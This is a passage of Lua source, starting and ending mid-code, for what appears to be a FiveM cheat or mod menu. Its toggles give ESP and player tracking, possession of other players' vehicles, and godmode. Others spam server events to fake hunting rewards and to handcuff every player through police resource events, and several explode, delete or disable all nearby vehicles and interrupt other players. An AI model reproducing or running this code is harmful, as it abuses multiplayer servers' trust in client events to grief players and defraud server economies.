              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, true )
              if wantedLvl then

                Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, true )
                Citizen.InvokeNative( 0xCF228E2AA03099C3, headId, wantedLvl )

              else

                Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, false )

              end
            else
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, false )
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, false )
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, false )
            end
            if showblip then

              if not DoesBlipExist( blip ) then
                blip = AddBlipForEntity( ped )
                SetBlipSprite( blip, 1 )
                Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
                SetBlipNameToPlayerName(blip, id)

              else

                veh = GetVehiclePedIsIn( ped, false )
                blipSprite = GetBlipSprite( blip )

                if not GetEntityHealth( ped ) then

                  if blipSprite ~= 274 then

                    SetBlipSprite( blip, 274 )
                    Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                    SetBlipNameToPlayerName(blip, id)

                  end

                elseif veh then

                  vehClass = GetVehicleClass( veh )
                  vehModel = GetEntityModel( veh )

                  if vehClass == 15 then

                    if blipSprite ~= 422 then

                      SetBlipSprite( blip, 422 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                      SetBlipNameToPlayerName(blip, id)

                    end

                  elseif vehClass == 16 then

                    if vehModel == GetHashKey( "besra" ) or vehModel == GetHashKey( "hydra" )
                    or vehModel == GetHashKey( "lazer" ) then

                      if blipSprite ~= 424 then

                        SetBlipSprite( blip, 424 )
                        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                        SetBlipNameToPlayerName(blip, id)

                      end

                    elseif blipSprite ~= 423 then

                      SetBlipSprite( blip, 423 )
                      Citizen.InvokeNative (0x5FBCA48327B914DF, blip, false )
                    end
                  elseif vehClass == 14 then
                    if blipSprite ~= 427 then
                      SetBlipSprite( blip, 427 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                    end
                  elseif vehModel == GetHashKey( "insurgent" ) or vehModel == GetHashKey( "insurgent2" )
                    or vehModel == GetHashKey( "limo2" ) then
                      if blipSprite ~= 426 then
                        SetBlipSprite( blip, 426 )
                        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                        SetBlipNameToPlayerName(blip, id)
                      end
                    elseif vehModel == GetHashKey( "rhino" ) then
                      if blipSprite ~= 421 then
                        SetBlipSprite( blip, 421 )
                        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                        SetBlipNameToPlayerName(blip, id)
                      end
                    elseif blipSprite ~= 1 then
                      SetBlipSprite( blip, 1 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
                      SetBlipNameToPlayerName(blip, id)
                    end
                    passengers = GetVehicleNumberOfPassengers( veh )
                    if passengers then
                      if not IsVehicleSeatFree( veh, -1 ) then
                        passengers = passengers + 1
                      end
                      ShowNumberOnBlip( blip, passengers )
                    else
                      HideNumberOnBlip( blip )
                    end
                  else
                    HideNumberOnBlip( blip )
                    if blipSprite ~= 1 then
                      SetBlipSprite( blip, 1 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
                      SetBlipNameToPlayerName(blip, id)
                    end
                  end
                  SetBlipRotation( blip, math.ceil( GetEntityHeading( veh ) ) ) -- update rotation
                  SetBlipNameToPlayerName( blip, id )
                  SetBlipScale( blip,  0.85 )
                  if IsPauseMenuActive() then
                    SetBlipAlpha( blip, 255 )
                  else
                    x1, y1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
                    x2, y2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
                    distance = ( math.floor( math.abs( math.sqrt( ( x1 - x2 ) * ( x1 - x2 ) + ( y1 - y2 ) * ( y1 - y2 ) ) ) / -1 ) ) + 900
                    if distance < 0 then
                      distance = 0
                    elseif distance > 255 then
                      distance = 255
                    end
                    SetBlipAlpha( blip, distance )
                  end
                end
              else
                RemoveBlip(blip)
              end
            end
          end
        end
        end)

        local entityEnumerator = {
          __gc = function(enum)
          if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
          end
          enum.destructor = nil
          enum.handle = nil
        end
      }

      function EnumerateEntities(initFunc, moveFunc, disposeFunc)
        return coroutine.wrap(function()
        local iter, id = initFunc()
        if not id or id == 0 then
          disposeFunc(iter)
          return
        end

        local enum = {handle = iter, destructor = disposeFunc}
        setmetatable(enum, entityEnumerator)

        local next = true
        repeat
          coroutine.yield(id)
          next, id = moveFunc(iter)
        until not next

        enum.destructor, enum.handle = nil, nil
        disposeFunc(iter)
        end)
      end

      function EnumeratePeds()
        return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
      end

      function EnumerateVehicles()
        return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
      end

      function EnumerateObjects()
        return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
      end

      function RotationToDirection(rotation)
        local retz = rotation.z * 0.0174532924
        local retx = rotation.x * 0.0174532924
        local absx = math.abs(math.cos(retx))

        return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
      end

      function OscillateEntity(entity, entityCoords, position, angleFreq, dampRatio)
        if entity ~= 0 and entity ~= nil then
          local direction = ((position - entityCoords) * (angleFreq * angleFreq)) - (2.0 * angleFreq * dampRatio * GetEntityVelocity(entity))
          ApplyForceToEntity(entity, 3, direction.x, direction.y, direction.z + 0.1, 0.0, 0.0, 0.0, false, false, true, true, false, true)
        end
      end

      local function PossessVehicle(target)
        PossessingVeh = not PossessingVeh

        if not PossessingVeh then
            SetEntityVisible(PlayerPedId(), true, 0)
            SetEntityCoords(PlayerPedId(), oldPlayerPos)
            SetEntityCollision(PlayerPedId(), true, 1)
        else
            SpectatePlayer(SelectedPlayer)
            notify("~b~Checking Player...")
            Wait(3000)
            if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), 0) then
                SpectatePlayer(SelectedPlayer)
                oldPlayerPos = GetEntityCoords(PlayerPedId())
                SetEntityVisible(PlayerPedId(), false, 0)
                SetEntityCollision(PlayerPedId(), false, 0)
            else
                SpectatePlayer(SelectedPlayer)
                PossessingVeh = false
                notify("~r~Player not in a vehicle!  (Try again?)")
            end
            
            
            local Markerloc = nil
            
    
            Citizen.CreateThread(function()
                local ped = GetPlayerPed(target)
                local veh = GetVehiclePedIsIn(ped, 0)
                
                while PossessingVeh do
                    
                    DrawTxt("~b~Possessing ~w~" .. GetPlayerName(target) .. "'s ~b~Vehicle", 0.1, 0.05, 0.0, 0.4)
                    DrawTxt("~b~Controls:\n~w~-------------------", 0.1, 0.2, 0.0, 0.4)
                    DrawTxt("~b~W/S: ~w~Forward/Back\n~b~SPACEBAR: ~w~Up\n~b~CTRL: ~w~Down\n~b~X: ~w~Cancel", 0.1, 0.25, 0.0, 0.4)
                    Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                    DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 0, 0, 180, 35, false, true, 2, nil, nil, false)
                    
                    local forward = SubVectors(Markerloc, GetEntityCoords(veh))
                    local vpos = GetEntityCoords(veh)
                    local vf = GetEntityForwardVector(veh)
                    local vrel = SubVectors(vpos, vf)
                    
                    SetEntityCoords(PlayerPedId(), vrel.x, vrel.y, vpos.z + 1.1)
                    SetEntityNoCollisionEntity(PlayerPedId(), veh, 1)
                    
                    RequestControlOnce(veh)
                    
                    if IsDisabledControlPressed(0, 32) then
                        ApplyForce(veh, forward * 0.1)
                    end
                    
                    if IsDisabledControlPressed(0, 8) then
                        ApplyForce(veh, -(forward * 0.1))
                    end
                    
                    if IsDisabledControlPressed(0, 22) then
                        ApplyForceToEntity(veh, 3, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    end
                    
                    if IsDisabledControlPressed(0, 36) then
                        ApplyForceToEntity(veh, 3, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    end
                    
                    if IsDisabledControlPressed(0, 73) or GetEntityHealth(PlayerPedId()) < 5.0 then
                        PossessingVeh = false
                        SetEntityVisible(PlayerPedId(), true, 0)
                        SetEntityCoords(PlayerPedId(), oldPlayerPos)
                        SetEntityCollision(PlayerPedId(), true, 1)
                    end
                    
                    Wait(0)
                end
            end)
        end
    end

      Citizen.CreateThread(
      function()
        while Enabled do
          Citizen.Wait(0)

          DisplayRadar(true)
          InvalidateIdleCam(true)
          SetPedCanRagdoll(PlayerPedId(-1), not antirag)

          if Godmode then
            local cP = KeyboardInput('Are you sure? Y/n', '', 0)
            if cP == 'Y' then
              SetPlayerInvincible(PlayerId())
              SetEntityInvincible(PlayerPedId())
            elseif cP == 'n' then
              notify(
              '~h~~r~Operation cancelled~s~.'
              )
            else
              notify(
              '~h~~r~Invalid Confirmation~s~.'
              )
              notify(
              '~h~~r~Operation cancelled~s~.'
              )
            end
          end

          if Demimode then
            SetEntityHealth(PlayerPedId(), 200)
          end

          if ePunch then
            SetExplosiveMeleeThisFrame(PlayerId())
          end

          if SuperJump then
            SetSuperJumpThisFrame(PlayerId(-1))
          end

          if InfStamina then
            RestorePlayerStamina(PlayerId(-1), 1.0)
          end

          if aquaman then
            SetPedDiesInWater(PlayerId(-1), false)
            SetEnableScuba(PlayerId(-1), true) 
            SetPedMaxTimeUnderwater(PlayerId(-1), 999.9)
          end

          if thirdperson then
            SetFollowVehicleCamViewMode(2)
            SetFollowPedCamViewMode(2)
          end 

          if Tracking then
            local coords = GetEntityCoords(GetPlayerPed(TrackedPlayer))
            SetNewWaypoint(coords.x, coords.y)
          end

          if FlingingPlayer then
            local coords = GetEntityCoords(GetPlayerPed(FlingedPlayer))
            Citizen.InvokeNative(0xE3AD2BDBAEE269AC, coords.x, coords.y, coords.z, 4, 1.0, 0, 1, 0.0, 1)
          end

          if NoHunThir then
            TriggerEvent("esx_status:set", "hunger", 1000000)
            TriggerEvent("esx_status:set", "thirst", 1000000)
            TriggerEvent('esx_status:set', 'stress', 0)
          end

          if bcFlash then
            SetSuperJumpThisFrame(PlayerId())
            SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
            SetPedMoveRateOverride(PlayerId(), 10)
            RequestNamedPtfxAsset("core")
            UseParticleFxAssetNextCall("core")
            StartNetworkedParticleFxNonLoopedOnEntity("ent_sht_electrical_box", PlayerPedId(), 0, 0, -0.5, 0, 0, 0, 1, false, false, false )
          end

          if tinyman then
            tinytim = true
            SetPedConfigFlag(PlayerPedId(), 223, true)
          elseif not tinyman and tinytim then
            tinytim = false
              SetPedConfigFlag(PlayerPedId(), 223, false)
          end

          if fastrun then
            SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
            SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
          else
            SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
            SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
          end

          if infAmmo then
            SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
            PedSkipNextReloading(GetPlayerPed(-1))
            SetPedShootRate(GetPlayerPed(-1), 1000)
          end

          if VehicleGun then
            local VehicleGunVehicle = "Freight"
            local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
            if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
              notify("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!", false)
              GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
              SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
              if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
                if IsPedShooting(GetPlayerPed(-1)) then
                  while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
                    Citizen.Wait(0)
                    RequestModel(GetHashKey(VehicleGunVehicle))
                  end
                  local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
                  SetEntityAsNoLongerNeeded(veh)
                  SetVehicleForwardSpeed(veh, 150.0)
                end
              end
            end
          end

          if forcegun then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
                for k in EnumeratePeds() do
                    local coords = GetEntityCoords(k)
                    if k ~= PlayerPedId() and GetDistanceBetweenCoords(pos, coords) <= 1.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
                
                for k in EnumerateVehicles() do
                    local coords = GetEntityCoords(k)
                    if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) and GetDistanceBetweenCoords(pos, coords) <= 3.0 then
                        local forward = GetEntityForwardVector(PlayerPedId())
                        RequestControlOnce(k)
                        ApplyForce(k, forward * 500)
                    end
                end
            
            end
        end

          if DeleteGun then
            local cB = getEntity(PlayerId(-1))
            if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
              notify(
              '~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!'
              )
              GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999, false, true)
              SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999)
              if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_PISTOL') then
                if IsPlayerFreeAiming(PlayerId(-1)) then
                  if IsEntityAPed(cB) then
                    if IsPedInAnyVehicle(cB, true) then
                      if IsControlJustReleased(1, 142) then
                        SetEntityAsMissionEntity(GetVehiclePedIsIn(cB, true), 1, 1)
                        DeleteEntity(GetVehiclePedIsIn(cB, true))
                        SetEntityAsMissionEntity(cB, 1, 1)
                        DeleteEntity(cB)
                        notify('~g~Deleted!')
                      end
                    else
                      if IsControlJustReleased(1, 142) then
                        SetEntityAsMissionEntity(cB, 1, 1)
                        DeleteEntity(cB)
                        notify('~g~Deleted!')
                      end
                    end
                  else
                    if IsControlJustReleased(1, 142) then
                      SetEntityAsMissionEntity(cB, 1, 1)
                      DeleteEntity(cB)
                      notify('~g~Deleted!')
                    end
                  end
                end
              end
            end
          end

          if AlwaysClean then
            SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
            SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
            SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
            SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
            Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
          end

          if nocollision then
            playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
            for k in EnumerateVehicles() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumerateObjects() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
            for k in EnumeratePeds() do
                SetEntityNoCollisionEntity(k, playerveh, true)
            end
          end

          if speedDemon then
            local veh = GetVehiclePedIsIn(PlayerPedId(), false)
            SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 10000000.0); -- mass on collison
            SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 10.0); --aerodynamics (less drag)
            SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDriveMaxFlatVel", 1000.0); --vehicle top speed at redline
            SetVehicleHandlingFloat(veh, "CHandlingData", "FPercentSubmerged", 10000000.0); --sink level
            SetVehicleHandlingFloat(veh, "CHandlingData", "fDriveBiasFront", 0.5); --4WD
            SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 5.0); --tire grip
            SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 5.0); --acceleration/braking grip
            SetVehicleHandlingFloat(veh, "CHandlingData", "fBrakeForce", 7.00); --game's calculation of deceleration
            SetVehicleHandlingFloat(veh, "CHandlingData", "fEngineDamageMult", 0.0); --game's calculation of damage to the engine, causing explosion or engine failure.
            SetVehicleHandlingFloat(veh, "CHandlingData", "FCollisonDamgeMult", 0.0); -- calculation of damage to the vehicle by collision.
            SetVehicleHandlingFloat(veh, "CHandlingData", "fSteeringLock", 50.00); --calculation of the angle of the steer wheel will turn while at full turn
            SetVehicleHandlingFloat(veh, "CHandlingData", "fRollCentreHeightFront", 0.34); --larger Numbers = less rollovers.
          end

          if seatbelt then
            SetPedCanBeKnockedOffVehicle(PlayerPedId(-1))
          end

          if IsPedInAnyVehicle(PlayerPedId()) then
            local pVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
            if driftMode then
              SetVehicleGravityAmount(pVehicle, 5.0)
            elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
              SetVehicleGravityAmount(pVehicle, 10.0)
            end


            if superGrip then
              SetVehicleGravityAmount(pVehicle, 20.0)
              SetHandlingInt(GetVehiclePedIsUsing(PlayerPedId()), CHandlingData, fTractionCurveMin, 1000000)
            elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
              SetVehicleGravityAmount(pVehicle, 10.0)
            end

            if enchancedGrip then
              SetVehicleGravityAmount(pVehicle, 12.0)
            elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
              SetVehicleGravityAmount(pVehicle, 10.0)
            end

            if fdMode then
              SetVehicleGravityAmount(pVehicle, 5.5)
              SetVehicleEngineTorqueMultiplier(pVehicle, 4.0)
            elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
              SetVehicleGravityAmount(pVehicle, 10.0)
              SetVehicleEngineTorqueMultiplier(pVehicle, 1.0)
            end
          end

          if MagicBullet then
            if IsPedShooting(PlayerPedId()) then
              local c2 = GetPedImpact(GetPlayerPed(-1))
              AddExplosion(c2.x, c2.y, c2.z, 4, 100.0, false, true, 0.0, true)
            end
          end

          if speedmit == true then
            while speedmit do
              local time = 1
              Citizen.Wait(5)
              local s = tonumber(GetEntitySpeed(GetVehiclePedIsIn(GetPlayerPed(-1)))) - 1
              if IsPedInAnyVehicle(GetPlayerPed(-1), false) == 1 then
                if s <= 0.3 then
                  SetVehicleOnGroundProperly(GetVehiclePedIsUsing(GetPlayerPed(-1), false))
                  print('measure worked')
                end
              else
                time = 0
                notify('~h~Hidden Speed Caution Measures Disabled')
                speedmit = false
              end
            end
          end

          if PedGuardPlayer then
            while PedGuardPlayer do
              Citizen.Wait(140)
              local i = 1
              local entity = getEntity(PlayerId())
              if IsPedInAnyVehicle(entity) then
                TaskDriveBy(
                pedlist[i],
                entity,
                pos.x,
                pos.y,
                pos.z,
                200,
                99,
                0,
                'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                )
                TaskShootAtEntity(
                pedlist[i],
                entity,
                200,
                'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                )
                makePedHostile(pedlist[i], entity, 0, 0)
                TaskCombatPed(pedlist[i], entity, 0, 16)
              elseif not IsPedInAnyVehicle(entity) then
                makePedHostile(pedlist[i], entity, 0, 0)
                TaskCombatPed(pedlist[i], entity, 0, 16)
              elseif i == #pedlist then
                i = 1
              end
            end
          end


          if Follow == true then
            Citizen.Wait(30)
            local ped = GetPlayerPed(-1)
            local vehicle = GetVehiclePedIsIn(ped, false)
            local co = GetEntityCoords(SelectedPlayer)
            TaskVehicleGotoNavmesh(ped, vehicle, co.x, co.y, co.z, 50, 156, 5)
          end

          if EVP == nil then
            print('EnVyP FTW')
            SetGamePaused(true)
          end

          if freezeall then
            for i = 0, 128 do
              TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
              TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
              TriggerServerEvent("cuffServer", GetPlayerServerId(i))
              TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
              TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
              TriggerServerEvent("esx_handcuffs:cuffing", GetPlayerServerId(i))
              TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(i))
            end
          end

          if fuckallcars then
            for playerVeh in EnumerateVehicles() do
              if (not IsPedAPlayer(GetPedInVehicleSeat(playerVeh, -1))) then
                SetVehicleHasBeenOwnedByPlayer(playerVeh, false)
                SetEntityAsMissionEntity(playerVeh, true, true)
                StartVehicleAlarm(playerVeh)
                DetachVehicleWindscreen(playerVeh)
                SmashVehicleWindow(playerVeh, 0)
                SmashVehicleWindow(playerVeh, 1)
                SmashVehicleWindow(playerVeh, 2)
                SmashVehicleWindow(playerVeh, 3)
                SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
                SetVehicleDoorBroken(playerVeh, 0, true)
                SetVehicleDoorBroken(playerVeh, 1, true)
                SetVehicleDoorBroken(playerVeh, 2, true)
                SetVehicleDoorBroken(playerVeh, 3, true)
                SetVehicleDoorBroken(playerVeh, 4, true)
                SetVehicleDoorBroken(playerVeh, 5, true)
                SetVehicleDoorBroken(playerVeh, 6, true)
                SetVehicleDoorBroken(playerVeh, 7, true)
                SetVehicleLights(playerVeh, 1)
                Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
                SetVehicleNumberPlateTextIndex(playerVeh, 5)

                SetVehicleDirtLevel(playerVeh, 10.0)
                SetVehicleModColor_1(playerVeh, 1)
                SetVehicleModColor_2(playerVeh, 1)
                SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
                SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
                SetVehicleBurnout(playerVeh, true)
              end
            end
          end

          if cardz then
            local pbase = GetActivePlayers()
            for i = 1, #pbase do
              if IsPedInAnyVehicle(GetPlayerPed(pbase[i]), true) then
                ClearPedTasksImmediately(GetPlayerPed(pbase[i]))
              end
            end
          end

          if gundz then
            local pbase = GetActivePlayers()
            for i = 1, #pbase do
              if i == PlayerPedId(-1) then i=i+1 end
              if IsPedShooting(GetPlayerPed(pbase[i])) then
                ClearPedTasksImmediately(GetPlayerPed(pbase[i]))
              end
            end
          end

          if destroyvehicles then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                NetworkRequestControlOfEntity(vehicle)
                SetVehicleUndriveable(vehicle,true)
                SetVehicleEngineHealth(vehicle, 0)
              end
            end
          end

          if alarmvehicles then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                NetworkRequestControlOfEntity(vehicle)
                SetVehicleAlarmTimeLeft(vehicle, 500)
                SetVehicleAlarm(vehicle,true)
                StartVehicleAlarm(vehicle)
              end
            end
          end

          if lolcars then
            for vehicle in EnumerateVehicles() do
              RequestControlOnce(vehicle)
              ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
            end
          end

          if explodevehicles then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                NetworkRequestControlOfEntity(vehicle)
                NetworkExplodeVehicle(vehicle, true, true, false)
              end
            end
          end

          if huntspam then
            Citizen.Wait(1)
            TSE('esx-qalle-hunting:reward', 20000)
            TSE('esx-qalle-hunting:sell')
          end

          if deletenearestvehicle then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1)
                DeleteEntity(GetVehiclePedIsIn(vehicle, true))
                SetEntityAsMissionEntity(vehicle, 1, 1)
                DeleteEntity(vehicle)
              end
            end
          end

          if norecoil then
            local cI = {
              [453432689] = 1.0,
              [3219281620] = 1.0,
              [1593441988] = 1.0,
              [584646201] = 1.0,
              [2578377531] = 1.0,
              [324215364] = 1.0,
              [736523883] = 1.0,
              [2024373456] = 1.0,
              [4024951519] = 1.0,
              [3220176749] = 1.0,
              [961495388] = 1.0,
              [2210333304] = 1.0,
              [4208062921] = 1.0,
              [2937143193] = 1.0,
              [2634544996] = 1.0,
              [2144741730] = 1.0,
              [3686625920] = 1.0,
              [487013001] = 1.0,
              [1432025498] = 1.0,
              [2017895192] = 1.0,
              [3800352039] = 1.0,
              [2640438543] = 1.0,
              [911657153] = 1.0,
              [100416529] = 1.0,
              [205991906] = 1.0,
              [177293209] = 1.0,
              [856002082] = 1.0,
              [2726580491] = 1.0,
              [1305664598] = 1.0,
              [2982836145] = 1.0,
              [1752584910] = 1.0,
              [1119849093] = 1.0,
              [3218215474] = 1.0,
              [1627465347] = 1.0,
              [3231910285] = 1.0,
              [-1768145561] = 1.0,
              [3523564046] = 1.0,
              [2132975508] = 1.0,
              [-2066285827] = 1.0,
              [137902532] = 1.0,
              [2828843422] = 1.0,
              [984333226] = 1.0,
              [3342088282] = 1.0,
              [1785463520] = 1.0,
              [1672152130] = 0,
              [1198879012] = 1.0,
              [171789620] = 1.0,
              [3696079510] = 1.0,
              [1834241177] = 1.0,
              [3675956304] = 1.0,
              [3249783761] = 1.0,
              [-879347409] = 1.0,
              [4019527611] = 1.0,
              [1649403952] = 1.0,
              [317205821] = 1.0,
              [125959754] = 1.0,
              [3173288789] = 1.0
            }
            if IsPedShooting(PlayerPedId(-1)) and not IsPedDoingDriveby(PlayerPedId(-1)) then
              local _, cJ = GetCurrentPedWeapon(PlayerPedId(-1))
              _, cAmmo = GetAmmoInClip(PlayerPedId(-1), cJ)
              if cI[cJ] and cI[cJ] ~= 0 then
                tv = 0
                if GetFollowPedCamViewMode() ~= 4 then
                  repeat
                    Wait(0)
                    p = GetGameplayCamRelativePitch()
                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
                    tv = tv + 0.0
                  until tv >= cI[cJ]
                else
                  repeat
                    Wait(0)
                    p = GetGameplayCamRelativePitch()
                    if cI[cJ] > 0.0 then
                      SetGameplayCamRelativePitch(p + 0.0, 0.0)
                      tv = tv + 0.0
                    else
                      SetGameplayCamRelativePitch(p + 0.0, 0.0)
                      tv = tv + 0.0
                    end
                  until tv >= cI[cJ]
                end
              end
            end
          end

          if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            if IsControlPressed(0, 209) then
              SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
            elseif IsControlPressed(0, 210) then
              SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
            end
          end

          if esp then
            for i=1,128 do
              if  ((NetworkIsPlayerActive( i )) and GetPlayerPed( i ) ~= GetPlayerPed( -1 )) then
                local ra = RGB(1.0)
                local pPed = GetPlayerPed(i)
                local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId(-1)))
                local x, y, z = table.unpack(GetEntityCoords(pPed))
                local disPlayerNames = 130
                local disPlayerNamesz = 999999
                if nameabove1 then
                  Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true)
                  if wantedLvl then
                    Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true)
                    Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                  else
                    Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                  end
                else
                  Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                  Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false)
                  Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false)
                end
                if nameabove2 then
                  local cK = false
                  local cL = 130
                  local cM = 0
                  for G = 0, 128 do
                    if NetworkIsPlayerActive(G) and GetPlayerPed(G) ~= GetPlayerPed(-1) then
                      ped = GetPlayerPed(G)
                      blip = GetBlipFromEntity(ped)
                      x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                      x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(G), true))
                      distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                      if cK then
                        if NetworkIsPlayerTalking(G) then
                          local cN = d(1.0)
                          DrawText3D(x2,y2,z2 + 1.2,GetPlayerServerId(G) .. '  |  ' .. GetPlayerName(G),cN.r,cN.g,cN.b)
                        else
                          DrawText3D(x2,y2,z2 + 1.2,GetPlayerServerId(G) .. '  |  ' .. GetPlayerName(G),255,255,255)
                        end
                      end
                      if distance < cL then
                        if not cK then
                          if NetworkIsPlayerTalking(G) then
                            local cN = d(1.0)
                            DrawText3D(x2,y2,z2 + 1.2,GetPlayerServerId(G) .. '  |  ' .. GetPlayerName(G),cN.r,cN.g,cN.b)
                          else
                            DrawText3D(x2,y2,z2 + 1.2,GetPlayerServerId(G) .. '  |  ' .. GetPlayerName(G),255,255,255)
                          end
                        end
                      end
                    end
                  end
                end
                if nameabove3 then
